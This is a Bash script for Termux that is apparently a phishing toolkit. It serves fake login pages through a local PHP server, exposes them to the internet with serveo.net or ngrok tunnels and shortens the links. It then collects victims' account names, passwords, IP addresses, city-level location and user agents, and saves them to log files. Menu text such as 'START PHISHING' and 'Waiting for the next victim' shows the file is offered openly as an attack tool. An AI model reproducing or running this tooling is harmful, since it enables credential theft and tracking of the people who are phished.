#!/bin/bash

# Clear the Termux shell
clear

# Custom logo ASCII art
echo "       ___________ _     "
echo "     |_   _| ___ \ |    "
echo "  __ _ | | | |_/ / |    "
echo " / _\` || | |  __/| |    "
echo "| (_| || |_| |   | |____"
echo " \__,_\___/\_|   \_____/"
echo "                        "


trap 'printf "\n";stop;exit 1' 2


dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
}

menu() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[1;93mMade By aSkxp#0\e[0m\en"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Are you subscribed to my channel? y/n: \e[0m\en' option

    if [[ $option == y || $option == Y ]]; then
        server="create"
        start1
    elif [[ $option == 99 ]]; then
        exit 1
    else
        printf "\e[1;93mMake sure to subscribe to my channel!\e[1;93m"
        xdg-open "https://youtube.com/@askxp"
        sleep 1
        exit
    fi
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi
    if [[ $checkphp == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        pkill -f -2 ssh > /dev/null 2>&1
        killall ssh > /dev/null 2>&1
    fi
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
}

catch_cred() {
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
    printf "\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Till The Next Victim To Open Send This Link To Another Person, Press Ctrl + C to exit...\e[0m\n"
}

catch_ip() {
    mkdir -p /storage/emulated/0/Log  # Create Log folder if it doesn't exist
    touch /storage/emulated/0/Log/ips.txt  # Create ips.txt file if it doesn't exist
    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    location=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.city' | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    if [[ -n "$location" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" "$location"
    else
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location is empty.\e[0m\n"
    fi
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Current Time:\e[0m\e[1;77m %s\e[0m\n" "$(date +"%T")"
    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
    if [[ -n "$ua" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
    else
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent is empty.\e[0m\n"
    fi
    if ! grep -qxF "$ip" /storage/emulated/0/Log/ips.txt; then
        echo "$ip" >> /storage/emulated/0/Log/ips.txt  # Append IP address to ips.txt if it's not a duplicate
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] IP saved to /storage/emulated/0/Log/ips.txt\e[0m\n"
    else
        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IP already exists in /storage/emulated/0/Log/ips.txt\e[0m\n"
    fi
    cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
    IFS='\n'
    printf "\n"
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for the next victim to open the link. Press Ctrl + C to exit...\e[0m\n"
}


serverx() {
    printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
    sh -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net 2> /dev/null > sendlink &"
    printf "\n"
    sleep 10
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf "\n"
    printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s \n' $send_link
    # Shorten the link using is.gd
    send_ip=$(curl -s "https://is.gd/create.php?format=simple&url=$send_link")
    if [ -n "$send_ip" ]; then
        printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Shortened link:\e[0m\e[1;77m %s \n' $send_ip
    else
        printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error: Failed to shorten link.\n'
    fi
    printf "\n"
    checkfound
}




startx() {
    if [[ -e sites/$server/ip.txt ]]; then
        rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
        rm -rf sites/$server/usernames.txt
    fi

    default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
    printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
    read port
    port="${port:-${default_port}}"
    serverx
}

start() {
    if [[ -e sites/$server/ip.txt ]]; then
        rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
        rm -rf sites/$server/usernames.txt
    fi

    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
        printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

            if [[ -e ngrok-stable-linux-arm.zip ]]; then
                unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi
        else
            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
            if [[ -e ngrok-stable-linux-386.zip ]]; then
                unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-stable-linux-386.zip
            else
                printf "\e[1;93m[!] Download error... \e[0m\n"
                exit 1
            fi
        fi
    fi

    printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
    cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10
    printf "\e[1;92m[\e[0m*\e[1;92m] Starting the phishing attack...\n"
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Send this link to the target:\e[0m\e[1;77m %s\n" $link
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for the target to open the link...\e[0m\n"
    checkfound
}

banner() {
    printf "\e[1;77m  ____   _       _     _        ___  "
    printf "\n\e[1;77m / ___| | |__   (_)   | |      / _ \ "
    printf "\n\e[1;77m \___ \ | '_ \  | |   | |     | | | |"
    printf "\n\e[1;77m  ___) || | | | | |___| |___  | |_| |"
    printf "\n\e[1;77m |____/ |_| |_| |_____|_____|  \___/ "
    printf "\n\e[1;77m                                    "
    printf "\n\e[1;77m Author   : Hackerlank"
    printf "\n\e[1;77m   __  __           _       _     _"
    printf "\n\e[1;77m  |  \/  |  _   _  (_)   __| |   / \ "
    printf "\n\e[1;77m  | |\/| | | | | | | |  / _\` |  / _ \"
    printf "\n\e[1;77m  | |  | | | |_| | | | | (_| | / ___ \"
    printf "\n\e[1;77m  |_|  |_|  \__,_| |_|  \__,_|/_/   \_\n\n\n\n\e[0m"
}


checkfound() {
    printf "\e[1;92m[\e[0m*\e[1;92m] Checking for victims... \e[0m\n"
    while [ true ]; do

        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Target Opened the Link!\n"
            catch_cred
            rm -rf sites/$server/usernames.txt
            printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for another victim...\e[0m\n"
        fi
        sleep 1
    done 
}

menux() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Made By aSkxp#0\e[0m\en"
    printf "\n\e[1;77m1\e[0m\e[1;92m. START PHISHING\e[0m"
    printf "\n\e[1;77m2\e[0m\e[1;92m. SAVE LOGS\e[0m"
    printf "\n\e[1;77m3\e[0m\e[1;92m. ABOUT\e[0m"
    printf "\n\e[1;77m4\e[0m\e[1;92m. SUBSCRIBE\e[0m"
    printf "\n\e[1;77m5\e[0m\e[1;92m. EXIT\e[0m\n\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Choose An Option:\e[0m\en"
    printf "\n\n\e[1;92m%s\e[0m" $domain
    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Select An Option: \e[0m\en' option
    if [[ $option -eq 1 ]]; then
        start1
    elif [[ $option -eq 2 ]]; then
        cd /storage/emulated/0/Log/
        printf "\n\n"
        pwd
        printf "\n\n"
        ls
        printf "\n\n"
        read -p "Enter The Filename: " file
        if [[ -e $file ]]; then
            printf "\n\n"
            cat $file
            printf "\n\n"
            printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Go Back To Menu...\e[0m"
            read hmmm
            banner
            menux
        else
            printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] File Not Found!\e[0m"
            printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Go Back To Menu...\e[0m"
            read hmmm
            banner
            menux
        fi
    elif [[ $option -eq 3 ]]; then
        printf "\n\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] The Phishing Pages Are Uploaded In /storage/emulated/0/Quack/ \e[0m\n"
        printf "\n\n"
        printf "\e[1;77m  ____   _       _     _        ___  "
        printf "\n\e[1;77m / ___| | |__   (_)   | |      / _ \ "
        printf "\n\e[1;77m \___ \ | '_ \  | |   | |     | | | |"
        printf "\n\e[1;77m  ___) || | | | | |___| |___  | |_| |"
        printf "\n\e[1;77m |____/ |_| |_| |_____|_____|  \___/ "
        printf "\n\e[1;77m                                    "
        printf "\n\e[1;77m Author   : Hackerlank"
        printf "\n\e[1;77m   __  __           _       _     _"
        printf "\n\e[1;77m  |  \/  |  _   _  (_)   __| |   / \ "
        printf "\n\e[1;77m  | |\/| | | | | | | |  / _\` |  / _ \"
        printf "\n\e[1;77m  | |  | | | |_| | | | | (_| | / ___ \"
        printf "\n\e[1;77m  |_|  |_|  \__,_| |_|  \__,_|/_/   \_\n\n\n\n\e[0m"
        printf "\n\n"
        printf "\e[1;77m Facebook   : Hackerlank\n"
        printf "\e[1;77m Instagram  : Hackerlank\n"
        printf "\e[1;77m Telegram   : Hackerlank\n"
        printf "\n\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Enter To Go Back To Menu...\e[0m"
        read hmmm
        banner
        menux
    elif [[ $option -eq 4 ]]; then
        printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Subscribe To Our YouTube Channel\n"
        printf "\n\n"
        xdg-open "https://www.youtube.com/channel/UClSag3Otl-LaaFKgfcUykwA"
        menux
    elif [[ $option -eq 5 ]]; then
        exit 1
    else
        printf "\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Invalid Option!\e[0m\n"
        menux
    fi
}

banner
dependencies
menux
